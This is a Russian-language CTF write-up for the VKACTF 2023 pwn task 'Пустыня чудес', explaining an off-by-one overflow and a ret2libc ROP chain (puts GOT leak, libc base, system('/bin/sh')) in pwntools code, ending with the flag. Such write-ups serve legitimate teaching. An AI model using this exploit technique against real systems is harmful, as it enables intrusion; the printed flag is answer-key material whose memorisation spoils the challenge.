# Прилавок Аладдина

|   Cобытие   | Название | Категория | Сложность |
| :---------: | :------: | :-------: | :-------: |
| VKACTF 2023 |  Пустыня чудес  |  Pwn  |  Легкая  |

## Описание

>Автор: old3gg, Ent3rG0dM0d3
>
>"Верблюд, султан, /bin/sh, flag... Хмм, так себе цепочка. В пустыне чудес можешь перепробовать все комбинации, только не разозли того парня из лампы..."

# Решение

1. Дан 64-битный исполняемый файл, изучив который, можно понять что в функции guessWord есть уязвимость  Off By One, а именно в месте , когда мы считаем длину i <= len вместо i < len, таким образом мы получаем драгоценное переполнение на 1 байт.

2. Понимаем, что переполняемый нами байт будет влиять на допустимую длину нашей полезной нагрузки, поэтому берём побольше.

```python
buffer_length = 32
payload = 'A' * buffer_length + 'z'
guess_word(payload, clean_buffer=True)
```
3. Далее нам нужно узнать версию нашей libc, поэтому проделываем всем известный слив адреса puts из таблицы got , для этого нам понадобится
- гаджет pop_rdi, адрес которого можно найти в бинаре с пмощью ropper или ROPgadget
- адрес puts_plt, который берем из бинаря 
- адрес функции gameloop, чтобы после слива адреса, опять вернуться в меню

```python
overflow_offset = 64
pop_rdi_ret = 0x40199b
puts_got = exe.got['puts']
puts_plt = exe.sym['puts']
game_loop = exe.sym['gameLoop']
payload = b'A' * overflow_offset + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) +  p64(game_loop)
guess_word(payload)

```

4. Теперь нам не составляет труда посчиать базу libc

```python
leak = u64(io.recvline(keepends=False).ljust(8,b'\x00'))
libc.address = leak - libc.sym['_IO_puts']
```

5. Финальным шагом после этого будет вызов функции system с аргументом /bin/sh

```python
binsh=next(libc.search(b'/bin/sh\x00'))
puts = libc.sym['puts']
system = libc.sym['system']
exit = libc.sym['exit']
payload= b'A' * overflow_offset+p64(pop_rdi_ret)+p64(binsh)+p64(pop_rdi_ret+1)+p64(system)
io.sendlineafter(b'Enter choice: ', b'2')
io.sendlineafter(b'Enter word: ', payload)
```

P.S. части флажка без лита могли попасться вам в списке заганных слов, но вряд ли с их помощью у вас получилось правильно подобрать настоящий флаг)

[Скрипт](../exploit/exploit.py) для решения задания.

```
vka{and_let_all_the_words_of_this_world_help_you_find_the_right_path}
```